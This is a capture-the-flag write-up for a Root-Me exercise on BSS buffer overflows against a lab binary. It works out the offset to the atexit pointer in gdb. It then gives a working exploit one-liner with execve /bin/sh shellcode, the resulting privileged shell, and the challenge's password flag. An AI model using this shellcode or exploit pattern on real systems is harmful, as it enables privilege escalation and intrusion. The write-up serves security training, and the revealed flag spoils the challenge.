# ELF x86 - BSS buffer overflow
```
Environment configuration :
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 No 
NX 	Non-Executable Stack 	                 No 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes 

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	SSH
Port	        2222
SSH access 	ssh -p 2222 app-systeme-ch7@challenge02.root-me.org   
Username	app-systeme-ch7
Password	app-systeme-ch7
```

In this challenge, the goal is to overwrite the _atexit_ function pointer using an overflow in the **cp_username** function.<br>
The _atexit_ and the _username_ are global variables. Therefore, those variables positioned at the _.bss_ section.<br>
Using gdb for disassembling, it's possible to see that the _atexit_ pointer is at **0x0804a240** and the _username_ is at **0x0804a040**.
There are 512 bytes between them (shocker).<br>

Let's verify those findings:
```gdb
(gdb) run `python -c "print 'A'*512 + 'DDDD'"`
Starting program: /challenge/app-systeme/ch7/ch7 `python -c "print 'A'*512 + 'DDDD'"`
[+] Running program with username : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDD

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
```
Now we've got controll on the _eip_ register and the flow of the program.<br>
So, because there are no protections, the plan is to put a simple shellcode in the input, and then jump there for execution.<br>
We know that we need to write 512 bytes in order to control the _eip_, and that the _username_ is at **0x0804a040** (no ASLR).<br>
So combining those 2 findings, one can get the following output:
```sh
app-systeme-ch7@challenge02:~$ ./ch7 `python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*489 + '\x40\xa0\x04\x08'"`
[+] Running program with username : 1�Ph//shh/bin��PS���
                                                        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@�
$ id
uid=1107(app-systeme-ch7) gid=1107(app-systeme-ch7) euid=1207(app-systeme-ch7-cracked) groups=1207(app-systeme-ch7-cracked),100(users),1107(app-systeme-ch7)
$ cat .passwd
aod8r2f!q:;oe

```
